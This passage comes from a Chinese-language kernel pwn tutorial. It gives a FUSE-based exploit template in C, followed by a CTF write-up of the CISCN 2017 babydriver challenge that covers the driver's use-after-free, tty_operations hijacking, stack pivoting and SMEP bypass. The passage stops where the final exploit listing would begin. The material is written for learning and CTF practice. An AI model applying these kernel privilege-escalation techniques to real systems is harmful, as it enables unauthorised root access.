class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FUSE_USE_VERSION 34</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_FILE_NAME <span class="hljs-meta-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-meta-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-meta-string">&quot;./evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-meta-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-keyword">char</span> *evil_args[] = &#123;EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">fuse_fill_dir_t</span> filler, <span class="hljs-keyword">off_t</span> offset, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info* fi, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info *fi)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                            <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span>;<br><br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">err_exit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, <span class="hljs-keyword">void</span>* buf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">fuse_fill_dir_t</span> filler, <span class="hljs-keyword">off_t</span> offset, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info* fi, </span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* path, struct stat *stbuf, </span></span><br><span class="hljs-params"><span class="hljs-function">                               struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                            <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-keyword">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fill your buffer with needed data there</span><br><span class="hljs-comment">     * this&#x27;s an example, filling it simply with &#x27;A&#x27;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> size, </span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-keyword">off_t</span> offset, struct fuse_file_info *fi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-keyword">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br><br>    <span class="hljs-comment">/* now you can do anything useful for exploit there */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuse_exploit_sample</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *nearby_page, *evil_page;<br>    <span class="hljs-keyword">int</span> evil_file_fd;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                     MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/** </span><br><span class="hljs-comment">     * now try reading or writing through nearby_page and evil_page in kernel, </span><br><span class="hljs-comment">     * the a3fuse_evil_read/a3fuse_evil_write will be triggered automatically</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* Your code here: */</span><br><br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* register for FUSE */</span><br>    fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>              &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">/* Your exploit here: */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>同时需要在编译选项中添加 <code>-I ./libfuse</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc -no-pie -static exp.c -I ./libfuse libfuse3.a -o exp -masm=intel -pthread -D_FILE_OFFSET_BITS=64</span><br></code></pre></div></td></tr></table></figure><h3 id="FUSE-in-CTF"><a href="#FUSE-in-CTF" class="headerlink" title="FUSE in CTF"></a><em>FUSE in CTF</em></h3><p>虽然我们有了可以静态编译的 libfuse 库，但在 CTF 的 kernel pwn 这样”残缺“的环境当中我们通常是无法使用 FUSE 的，因而就无法使用这种利用手法：(</p><p><a href="https://s2.loli.net/2023/01/11/lMx5TnkEivWryFX.png"><img src="https://s2.loli.net/2023/02/06/LFGCMByWh4c72dl.png" alt="image.png"></a></p><p><a href="https://s2.loli.net/2023/01/15/e12LwEHGJmXjpx5.png"><img src="https://s2.loli.net/2023/02/06/RdLs89OItX4k6TZ.png" alt="image.png"></a></p><p><a href="https://s2.loli.net/2023/01/15/LcHPW1EVi7A6rwK.png"><img src="https://s2.loli.net/2023/02/06/XoT4p3imxIuE6tf.png" alt="image.png"></a></p><blockquote><p>不过可以在完备的真实环境中使用这种利用手法 : ）</p></blockquote><h1 id="Kernel-Heap-Use-After-Free"><a href="#Kernel-Heap-Use-After-Free" class="headerlink" title="Kernel Heap - Use After Free"></a>Kernel Heap - Use After Free</h1><p>UAF 即 Use After Free，通常指的是<strong>对于释放后未重置的垂悬指针的利用</strong>，此前在用户态下的 heap 阶段对于 ptmalloc 的利用很多都是基于UAF漏洞进行进一步的利用</p><p>在 CTF 当中，内核的“堆内存”主要指的是线性映射区（direct mapping area），常用的分配函数 kmalloc 从此处分配内存，常用的分配器为 slub，若是在 kernel 中存在着垂悬指针，我们同样可以以此完成对 slab/slub 内存分配器的利用，通过 Kernel UAF 完成提权</p><p>slub 分配器的结构笔者在 <a href="#slab" style="font-weight:bold">本页这里</a> 中已经进行简要叙述，若是不记得了可以回去看看（笑）</p><p><span id="fuck"> </span>在保护机制中引用的文章里看到如果开启了SLAB_ACCOUNT也能照样利用, 前提是有着一个general cache中的UAF: </p><ol><li>Spray cache <em>A</em> (which should be trivial given it is a general-purpose cache) filling in all partial slabs.</li><li>Trigger freeing the vulnerable object and then free all sprayed objects at the same time.</li><li>Spray objects from cache <em>B</em>.</li><li>Trigger the UAF.</li></ol><p>在释放spray后的general cache A后, 整个slab可能会被移动到special cache B中继续使用, 此时仍然可以达成一样的目的. </p><p><strong>But</strong> the technique itself is obviously <strong>less reliable</strong> since it relies on the entire slab being reallocated to another cache, but given there are no memory restrictions, it can achieve a high success rate. </p><h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><blockquote><p>可以说是最最最最最最最经典的kernel pwn入门题</p><p><a href="https://arttnba3.cn/download/ciscn2017/pwn/babydriver.tar.gz">点击下载-babydriver.tar.gz</a></p></blockquote><p>解压，惯例的<code>磁盘镜像 + 内核镜像 + 启动脚本</code>结构</p><p>查看<code>boot.sh</code>：<del>写的好乱啊</del>（<del>恼</del>）</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;  -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s<br></code></pre></div></td></tr></table></figure><ul><li>开启了SMEP保护</li></ul><p>解压磁盘镜像看看有没有什么可以利用的东西</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> mkdir core</span><br><span class="hljs-meta">$</span><span class="bash"> cp ./core.cpio ./core</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> core</span><br><span class="hljs-meta">$</span><span class="bash"> cpio -idv &lt; ./core.cpio</span><br></code></pre></div></td></tr></table></figure><p>查看其启动脚本<code>init</code>：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></div></td></tr></table></figure><p>其中加载了一个叫做<code>babydriver.ko</code>的驱动，按照惯例这个就是有着漏洞的驱动</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>惯例的<code>checksec</code>，发现其只开了NX保护，<del>整挺好</del> </p><p><a href="https://i.loli.net/2021/03/03/eyaFXu2CQ3mwAg4.png"><img src="https://s2.loli.net/2023/02/06/vmYbaP24V6TSokx.png" alt="image.png" style="zoom:50%;" /></a></p><p>拖入IDA进行分析</p><p>在驱动被加载时会初始化一个设备节点文件<code>/dev/babydev</code></p><p><a href="https://i.loli.net/2021/03/03/pYZeduBDUzfayK9.png"><img src="https://s2.loli.net/2023/02/06/iGPY8DdFmfkRu5I.png" alt="image.png" style="zoom:67%;" /></a></p><p>在我们使用open()打开设备文件时该驱动会分配一个chunk，<strong>该chunk的指针储存于全局变量</strong><code>babydev_struct</code>中</p><p><a href="https://i.loli.net/2021/03/03/yvjCraBZLeVb4NG.png"><img src="https://s2.loli.net/2023/02/06/pFMtlAJr7hsgO8R.png" alt="image.png" style="zoom:67%;" /></a></p><p>使用<code>ioctl</code>进行通信则可以重新申请内存，改变该chunk的大小</p><p><a href="https://i.loli.net/2021/03/03/Z5sSkiez27yN9EA.png"><img src="https://s2.loli.net/2023/02/06/n5Mbs9IKAU1Lchp.png" alt="image.png" style="zoom:67%;" /></a></p><p>在关闭设备文件时会<strong>释放该chunk，但是并未将指针置NULL，存在UAF漏洞</strong></p><p><a href="https://i.loli.net/2021/03/03/ehPoXGFKJ71Dwfl.png"><img src="https://s2.loli.net/2023/02/06/9QLTcPAYyeDChKi.png" alt="image.png" style="zoom:67%;" /></a></p><p>read和write就是简单的读写该chunk，便不贴图了</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>若是我们的程序打开两次设备<code>babydev</code>，由于其chunk储存在全局变量中，那么我们将会获得<strong>指向同一个 chunk的两个指针</strong></p><p>而在关闭设备后该 chunk 虽然被释放，但是指针未置0，那么我们便可以<strong>通过另一个文件描述符操作该 chunk</strong>，即<strong>存在 Use After Free 漏洞</strong></p><h3 id="漏洞利用：Kernel-UAF-stack-migitation-SMEP-bypass-ret2usr"><a href="#漏洞利用：Kernel-UAF-stack-migitation-SMEP-bypass-ret2usr" class="headerlink" title="漏洞利用：Kernel UAF + stack migitation + SMEP bypass + ret2usr"></a>漏洞利用：Kernel UAF + stack migitation + SMEP bypass + ret2usr</h3><p>内核符号表可读（白给），我们能够很方便地获得相应内核函数的地址</p><p><a href="https://i.loli.net/2021/08/01/yloiSIGwWN8U1gq.png"><img src="https://s2.loli.net/2023/02/06/dxDr9gRPztAeksH.png" alt="image.png"></a></p><p>没有开启 kaslr，所以可以直接从 vmlinux 中提取gadget地址，这里 <strong>ROPgadget 和 ropper 半斤八两，建议两个配合着一起用</strong></p><p>由于开启了 SMEP 保护，无法直接 ret2usr，故我们需要改变 cr4 寄存器的值以 bypass smep</p><p>观察到在内核中有着如下的 gadget 可以很方便地改变 cr4 寄存器的值：</p><p><a href="https://i.loli.net/2021/03/11/rztYCIH579dc6vu.png"><img src="https://s2.loli.net/2023/02/06/gkqITft14bn6rwm.png" alt="image.png" style="zoom:67%;" /></a></p><p>接下来考虑如何通过 UAF 劫持程序执行流</p><h4 id="tty-operations：tty-设备操作关联函数表"><a href="#tty-operations：tty-设备操作关联函数表" class="headerlink" title="tty_operations：tty 设备操作关联函数表"></a>tty_operations：tty 设备操作关联函数表</h4><p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code> </p><p>那么我们不难想到的是我们可以通过 UAF 劫持 <code>/dev/ptmx</code> 这个设备的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p><p>由于没有开启SMAP保护，故我们可以在用户态进程的栈上布置ROP链与<code>fake tty_operations</code>结构体</p><blockquote><p>结构体<code>tty_struct</code>位于<code>include/linux/tty.h</code>中，<code>tty_operations</code>位于<code>include/linux/tty_driver.h</code>中</p></blockquote><p>内核中没有类似<code>one_gadget</code>一类的东西，因此为了完成ROP我们还需要进行一次<strong>栈迁移</strong> </p><p>使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持<code>tty_operaionts</code>结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数指针以方便下断点：</p><p><a href="https://i.loli.net/2021/03/16/iKBLSsbPT9zcNqQ.png"><img src="https://s2.loli.net/2023/02/06/u5Ma2oVqtbDe6Ls.png" alt="image.png" style="zoom:67%;" /></a></p><p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头</p><p>使用ROPgadget查找相关gadget，发现有两条符合我们要求的gadget：</p><p><a href="https://i.loli.net/2021/03/16/o4c9ryjOBAkit8W.png"><img src="https://s2.loli.net/2023/02/06/hMT1Yq56Fs2cuGE.png" alt="image.png" style="zoom:67%;" /></a></p><p>gdb调试，发现第一条gadget其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p><p><a href="https://i.loli.net/2021/03/16/Qd2sk6TngZa5EDR.png"><img src="https://s2.loli.net/2023/02/06/Ib6pcNPLVtnziSR.png" alt="image.png" style="zoom:67%;" /></a></p><p>那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链</p><p>而<code>tty_operations</code>结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可</p><p><a href="https://i.loli.net/2021/03/16/7bROpernV1lSIjs.png"><img src="https://s2.loli.net/2023/02/06/Oi1EKWaA2M6Inz3.png" alt="image.png" style="zoom:80%;" /></a></p><p>需要注意的是<strong>计算相应结构体大小时应当选取与题目相同版本的内核源码</strong></p><p>最终的exploit应当如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 